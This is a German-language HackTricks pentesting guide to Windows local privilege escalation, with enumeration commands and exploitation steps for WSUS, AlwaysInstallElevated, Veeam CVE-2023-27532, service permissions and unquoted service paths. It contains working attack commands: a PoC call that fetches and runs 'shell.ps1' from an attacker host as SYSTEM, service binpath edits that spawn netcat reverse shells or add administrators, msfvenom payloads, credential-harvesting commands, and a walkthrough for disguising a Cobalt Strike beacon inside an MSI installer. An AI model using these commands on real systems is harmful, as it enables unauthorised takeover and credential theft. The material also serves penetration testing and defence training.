# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Grundlagen zu Windows

### Access Tokens

**Wenn du nicht weißt, was Windows Access Tokens sind, lies die folgende Seite, bevor du fortfährst:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Siehe die folgende Seite für mehr Informationen über ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Wenn du nicht weißt, was integrity levels in Windows sind, solltest du die folgende Seite lesen, bevor du fortfährst:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows-Sicherheitskontrollen

Es gibt verschiedene Dinge in Windows, die dich daran hindern können, das System zu **enumerieren**, ausführbare Dateien auszuführen oder sogar deine Aktivitäten zu **erkennen**. Du solltest die folgende **Seite** **lesen** und all diese **Abwehrmechanismen** **aufzählen**, bevor du mit der privilege escalation enumeration beginnst:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

UIAccess-Prozesse, die über `RAiLaunchAdminProcess` gestartet werden, können missbraucht werden, um High IL ohne Prompts zu erreichen, wenn AppInfo secure-path Checks umgangen werden. Prüfe den dedizierten UIAccess/Admin Protection Bypass-Workflow hier:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

## System-Info

### Versionsinformationen

Prüfe, ob die Windows-Version bekannte Schwachstellen hat (prüfe auch die installierten Patches).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Versions-Exploits

This [site](https://msrc.microsoft.com/update-guide/vulnerability) ist praktisch, um detaillierte Informationen zu Microsoft-Sicherheitslücken zu recherchieren. Diese Datenbank enthält mehr als 4.700 Sicherheitslücken und zeigt die **massive attack surface**, die eine Windows-Umgebung bietet.

**Auf dem System**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas hat watson eingebettet)_

**Lokal mit Systeminformationen**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**GitHub-Repositories mit Exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Umgebung

Sind irgendwelche Credentials/juicy Informationen in den Umgebungsvariablen gespeichert?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell-Verlauf
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transkriptdateien

Weitere Informationen, wie Sie dies aktivieren, finden Sie unter [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Details der PowerShell-Pipeline-Ausführungen werden aufgezeichnet; dazu gehören ausgeführte Befehle, Aufrufparameter und Teile von Skripten. Vollständige Ausführungsdetails und Ausgabeergebnisse werden jedoch möglicherweise nicht komplett erfasst.

Um dies zu aktivieren, befolge die Anweisungen im Abschnitt "Transcript files" der Dokumentation und wähle **"Module Logging"** anstelle von **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Um die letzten 15 Ereignisse aus den PowersShell logs anzuzeigen, können Sie Folgendes ausführen:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Eine vollständige Aufzeichnung aller Aktivitäten und des gesamten Inhalts der Skriptausführung wird erfasst, sodass jeder Codeblock während seiner Ausführung dokumentiert ist. Dieser Prozess bewahrt einen umfassenden Audit-Trail jeder Aktivität und ist wertvoll für die Forensik und die Analyse bösartigen Verhaltens. Durch die Dokumentation aller Aktivitäten zum Zeitpunkt der Ausführung werden detaillierte Einblicke in den Prozess geboten.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Ereignisse des Script Block-Loggings finden Sie in der Windows-Ereignisanzeige unter folgendem Pfad: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Um die letzten 20 Ereignisse anzuzeigen, können Sie Folgendes verwenden:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internet-Einstellungen
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Laufwerke
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Sie können das System kompromittieren, wenn die Updates nicht über http**S** sondern über http angefordert werden.

Sie beginnen damit zu prüfen, ob das Netzwerk ein nicht-SSL WSUS-Update verwendet, indem Sie Folgendes in cmd ausführen:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Oder das Folgende in PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Wenn du eine Antwort wie eine der folgenden erhältst:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Und wenn `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` oder `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` gleich `1` ist.

Dann ist es **ausnutzbar.** Wenn der zuletzt genannte Registrierungswert gleich `0` ist, wird der WSUS-Eintrag ignoriert.

Um diese Schwachstellen auszunutzen, können Sie Tools wie verwenden: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — dies sind MiTM-weaponisierte Exploit-Skripte, um 'fake' Updates in non-SSL WSUS-Traffic zu injizieren.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Lesen Sie den vollständigen Bericht hier**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Im Wesentlichen ist dies die Schwachstelle, die von diesem Bug ausgenutzt wird:

> Wenn wir die Möglichkeit haben, unseren lokalen Benutzer-Proxy zu ändern, und Windows Updates den in den Internet Explorer-Einstellungen konfigurierten Proxy verwendet, haben wir damit die Möglichkeit, [PyWSUS](https://github.com/GoSecure/pywsus) lokal auszuführen, um unseren eigenen Traffic abzufangen und Code als erhöhter Benutzer auf unserem Asset auszuführen.
>
> Außerdem, da der WSUS-Dienst die Einstellungen des aktuellen Benutzers verwendet, wird er auch dessen Zertifikatsspeicher nutzen. Wenn wir ein selbstsigniertes Zertifikat für den WSUS-Hostname erzeugen und dieses Zertifikat in den Zertifikatsspeicher des aktuellen Benutzers einfügen, können wir sowohl HTTP- als auch HTTPS-WSUS-Traffic abfangen. WSUS verwendet keine HSTS-ähnlichen Mechanismen, um eine trust-on-first-use-ähnliche Validierung des Zertifikats umzusetzen. Wenn das präsentierte Zertifikat vom Benutzer vertraut wird und den korrekten Hostnamen hat, wird es vom Dienst akzeptiert.

Sie können diese Schwachstelle mit dem Tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) ausnutzen (sobald es verfügbar ist).

## Drittanbieter-Auto-Updater und Agent-IPC (local privesc)

Viele Enterprise-Agenten stellen eine localhost IPC-Oberfläche und einen privilegierten Update-Kanal zur Verfügung. Wenn die Enrollment auf einen Angreifer-Server umgelenkt werden kann und der Updater einer rogue root CA oder schwachen Signaturprüfungen vertraut, kann ein lokaler Benutzer ein bösartiges MSI liefern, das vom SYSTEM-Dienst installiert wird. Eine verallgemeinerte Technik (basierend auf der Netskope stAgentSvc chain – CVE-2025-0309) finden Sie hier:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` legt einen localhost-Dienst auf **TCP/9401** offen, der attacker-controlled Nachrichten verarbeitet und beliebige Befehle als **NT AUTHORITY\SYSTEM** ermöglicht.

- **Recon**: bestäti­gen Sie den Listener und die Version, z. B. `netstat -ano | findstr 9401` und `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: legen Sie einen PoC wie `VeeamHax.exe` zusammen mit den benötigten Veeam-DLLs in dasselbe Verzeichnis und triggern Sie dann eine SYSTEM-Payload über den lokalen Socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Der Dienst führt den Befehl als SYSTEM aus.
## KrbRelayUp

Eine **local privilege escalation**-Schwachstelle besteht in Windows-**domain**-Umgebungen unter bestimmten Bedingungen. Zu diesen Bedingungen gehören Umgebungen, in denen **LDAP signing is not enforced,** Benutzer über Selbstrechte verfügen, die es ihnen erlauben, **Resource-Based Constrained Delegation (RBCD)** zu konfigurieren, und die Möglichkeit für Benutzer, Computer innerhalb der Domain zu erstellen. Es ist wichtig zu beachten, dass diese **Anforderungen** mit den **Standardeinstellungen** erfüllt sind.

Finde den **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Für weitere Informationen zum Ablauf des Angriffs siehe [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Wenn** diese 2 Registrierungswerte **aktiviert** (Wert ist **0x1**) sind, können Benutzer beliebiger Berechtigungsstufe `*.msi`-Dateien **installieren** (ausführen) als NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Wenn du eine meterpreter-Session hast, kannst du diese Technik mit dem Modul **`exploit/windows/local/always_install_elevated`** automatisieren

### PowerUP

Verwende den `Write-UserAddMSI`-Befehl von power-up, um im aktuellen Verzeichnis eine Windows MSI binary zu erstellen, um Privilegien zu eskalieren. Dieses Skript schreibt einen vorcompilierten MSI-Installer, der zur Hinzufügung eines Benutzers/einer Gruppe auffordert (du benötigst dafür GUI-Zugriff):
```
Write-UserAddMSI
```
Führe einfach die erstellte Binärdatei aus, um Privilegien zu eskalieren.

### MSI Wrapper

Lies dieses Tutorial, um zu lernen, wie man einen MSI Wrapper mit diesen Tools erstellt. Beachte, dass du eine "**.bat**"-Datei einpacken kannst, wenn du **nur** Befehlszeilen **ausführen** möchtest.


{{#ref}}
msi-wrapper.md
{{#endref}}

### MSI mit WIX erstellen


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### MSI mit Visual Studio erstellen

- **Generate** mit Cobalt Strike oder Metasploit eine **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Öffne **Visual Studio**, wähle **Create a new project** und gib "installer" in das Suchfeld ein. Wähle das Projekt **Setup Wizard** und klicke **Next**.
- Gib dem Projekt einen Namen, zum Beispiel **AlwaysPrivesc**, verwende **`C:\privesc`** als Ort, aktiviere **place solution and project in the same directory**, und klicke **Create**.
- Klicke weiter auf **Next**, bis du zu Schritt 3 von 4 (Dateien zum Einschließen auswählen) gelangst. Klicke **Add** und wähle die zuvor generierte Beacon-Payload aus. Klicke dann **Finish**.
- Markiere das Projekt **AlwaysPrivesc** im **Solution Explorer** und ändere in den **Properties** **TargetPlatform** von **x86** auf **x64**.
- Es gibt weitere Eigenschaften, die du ändern kannst, wie **Author** und **Manufacturer**, was die installierte App legitimer erscheinen lassen kann.
- Rechtsklicke das Projekt und wähle **View > Custom Actions**.
- Rechtsklicke **Install** und wähle **Add Custom Action**.
- Doppelklicke auf **Application Folder**, wähle deine **beacon.exe**-Datei und klicke **OK**. Dadurch wird sichergestellt, dass die Beacon-Payload ausgeführt wird, sobald der Installer gestartet wird.
- Ändere unter den **Custom Action Properties** **Run64Bit** auf **True**.
- Baue es schließlich **build it**.
- Falls die Warnung `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` angezeigt wird, stelle sicher, dass du die Plattform auf x64 setzt.

### MSI Installation

Um die **Installation** der bösartigen `.msi`-Datei im **Hintergrund** auszuführen:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Um diese Schwachstelle auszunutzen, können Sie _exploit/windows/local/always_install_elevated_ verwenden.

## Antivirus und Detektoren

### Audit-Einstellungen

Diese Einstellungen legen fest, was **protokolliert** wird, daher sollten Sie darauf achten.
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding ist interessant, um zu wissen, wohin die logs gesendet werden.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** ist für die **Verwaltung von lokalen Administratorpasswörtern** konzipiert und stellt sicher, dass jedes Passwort auf Computern, die einer Domäne angehören, **einzigartig, zufällig und regelmäßig aktualisiert** wird. Diese Passwörter werden sicher in Active Directory gespeichert und können nur von Benutzern abgerufen werden, denen über ACLs ausreichende Berechtigungen gewährt wurden, sodass sie die lokalen Admin-Passwörter bei entsprechender Autorisierung einsehen können.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Wenn aktiviert, werden **Passwörter im Klartext in LSASS** (Local Security Authority Subsystem Service) gespeichert.\
[**Mehr Informationen zu WDigest auf dieser Seite**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Ab **Windows 8.1** führte Microsoft einen erweiterten Schutz für die Local Security Authority (LSA) ein, um Versuche nicht vertrauenswürdiger Prozesse zu **blockieren**, auf deren Speicher zu **zugreifen** oder Code zu injizieren, und so das System zusätzlich abzusichern.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** wurde in **Windows 10** eingeführt. Sein Zweck ist es, die auf einem Gerät gespeicherten Credentials gegen Bedrohungen wie pass-the-hash attacks zu schützen.| [**Mehr Informationen zu Credential Guard hier.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Zwischengespeicherte Anmeldeinformationen

**Domänen-Anmeldeinformationen** werden von der **Local Security Authority** (LSA) authentifiziert und von Komponenten des Betriebssystems verwendet. Wenn die Anmeldedaten eines Benutzers von einem registrierten Sicherheits-Paket authentifiziert werden, werden in der Regel Domänen-Anmeldeinformationen für den Benutzer erstellt.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Benutzer & Gruppen

### Benutzer & Gruppen auflisten

Du solltest prüfen, ob eine der Gruppen, denen du angehörst, interessante Berechtigungen hat
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privilegierte Gruppen

Wenn du **einer privilegierten Gruppe angehörst, kannst du möglicherweise Privilegien eskalieren**. Erfahre hier mehr über privilegierte Gruppen und wie man sie missbraucht, um Privilegien zu eskalieren:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token-Manipulation

**Erfahre mehr** darüber, was ein **token** ist, auf dieser Seite: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Sieh dir die folgende Seite an, um **mehr über interessante tokens** und deren Missbrauch zu erfahren:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Angemeldete Benutzer / Sessions
```bash
qwinsta
klist sessions
```
### Home-Ordner
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Passwortrichtlinie
```bash
net accounts
```
### Inhalt der Zwischenablage abrufen
```bash
powershell -command "Get-Clipboard"
```
## Laufende Prozesse

### Datei- und Ordnerberechtigungen

Zuerst, beim Auflisten der Prozesse **prüfe auf Passwörter in der Befehlszeile des Prozesses**.\
Prüfe, ob du ein laufendes binary **überschreiben** kannst oder ob du Schreibrechte am binary-Ordner hast, um mögliche [**DLL Hijacking attacks**](dll-hijacking/index.html) auszunutzen:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Prüfe immer, ob mögliche [**electron/cef/chromium debuggers** laufen; du könntest sie missbrauchen, um Privilegien zu eskalieren](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Berechtigungen der Prozess-Binaries überprüfen**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Berechtigungen der Ordner der Binaries von Prozessen prüfen (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Du kannst ein Speicherabbild eines laufenden Prozesses mit **procdump** von sysinternals erstellen. Dienste wie FTP haben die **credentials in clear text in memory** — versuche, den Speicher zu dumpen und die credentials zu lesen.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Unsichere GUI-Apps

**Als SYSTEM laufende Anwendungen können einem Benutzer erlauben, eine CMD zu starten oder Verzeichnisse zu durchsuchen.**

Beispiel: "Windows Help and Support" (Windows + F1), suche nach "command prompt", klicke auf "Click to open Command Prompt"

## Services

Service Triggers ermöglichen es Windows, einen Service zu starten, wenn bestimmte Bedingungen eintreten (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). Auch ohne SERVICE_START-Rechte kann man häufig privilegierte Services starten, indem man deren Trigger auslöst. Siehe Auflistungs- und Aktivierungstechniken hier:

-
{{#ref}}
service-triggers.md
{{#endref}}

Liste der Services abrufen:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Berechtigungen

Sie können **sc** verwenden, um Informationen zu einem Dienst zu erhalten
```bash
sc qc <service_name>
```
Es wird empfohlen, das Binary **accesschk** von _Sysinternals_ zu verwenden, um das für jeden Dienst erforderliche Privilegienlevel zu prüfen.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Es wird empfohlen zu prüfen, ob "Authenticated Users" einen Dienst ändern können:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Dienst aktivieren

Wenn Sie diesen Fehler erhalten (zum Beispiel bei SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Sie können ihn wie folgt aktivieren
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Beachte, dass der Dienst upnphost für seine Funktion auf SSDPSRV angewiesen ist (für XP SP1)**

**Eine weitere Umgehungslösung** dieses Problems ist das Ausführen von:
```
sc.exe config usosvc start= auto
```
### **Service-Binärpfad ändern**

Im Szenario, in dem die Gruppe "Authenticated users" über **SERVICE_ALL_ACCESS** für einen Service verfügt, ist es möglich, die ausführbare Binärdatei des Service zu ändern. Um **sc** zu modifizieren und auszuführen:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Dienst neu starten
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privilegien können durch verschiedene Berechtigungen eskaliert werden:

- **SERVICE_CHANGE_CONFIG**: Ermöglicht die Neukonfiguration der Service-Binärdatei.
- **WRITE_DAC**: Ermöglicht die Änderung von Berechtigungen, was dazu führen kann, dass Service-Konfigurationen geändert werden können.
- **WRITE_OWNER**: Erlaubt den Erwerb des Besitzes und die Änderung von Berechtigungen.
- **GENERIC_WRITE**: Ermöglicht ebenfalls die Änderung von Service-Konfigurationen.
- **GENERIC_ALL**: Ermöglicht ebenfalls die Änderung von Service-Konfigurationen.

Zur Erkennung und Ausnutzung dieser Schwachstelle kann das _exploit/windows/local/service_permissions_ verwendet werden.

### Schwache Berechtigungen von Service-Binärdateien

**Prüfe, ob du die Binärdatei ändern kannst, die von einem Service ausgeführt wird** oder ob du **Schreibrechte auf den Ordner** hast, in dem die Binärdatei liegt ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Du kannst alle Binärdateien, die von einem Service ausgeführt werden, mit **wmic** (nicht in system32) ermitteln und deine Berechtigungen mit **icacls** prüfen:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Sie können auch **sc** und **icacls** verwenden:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Service-Registry: Änderungsberechtigungen

Sie sollten prüfen, ob Sie eine Service-Registry ändern können.\
Sie können Ihre **Berechtigungen** an einer Service-**Registry** **prüfen**, indem Sie:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Es sollte überprüft werden, ob **Authenticated Users** oder **NT AUTHORITY\INTERACTIVE** `FullControl`-Berechtigungen besitzen. Falls ja, kann die vom Dienst ausgeführte binary verändert werden.

Um den Pfad der ausgeführten binary zu ändern:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services registry AppendData/AddSubdirectory-Berechtigungen

Wenn Sie diese Berechtigung für einen Registry-Schlüssel haben, bedeutet das, dass **Sie aus diesem Schlüssel Unter-Registries erstellen können**. Im Fall von Windows-Services ist dies **ausreichend, um beliebigen Code auszuführen:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Wenn der Pfad zu einer ausführbaren Datei nicht in Anführungszeichen steht, versucht Windows, jede Teilfolge bis zum nächsten Leerzeichen als ausführbares Programm zu starten.

Zum Beispiel würde Windows für den Pfad _C:\Program Files\Some Folder\Service.exe_ versuchen, folgende Pfade auszuführen:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Liste alle unquoted service paths auf, ausgenommen diejenigen, die zu den integrierten Windows-Diensten gehören:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**You can detect and exploit** diese Schwachstelle mit metasploit: `exploit/windows/local/trusted\_service\_path` Sie können mit metasploit manuell eine Service-Binärdatei erstellen:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Wiederherstellungsaktionen

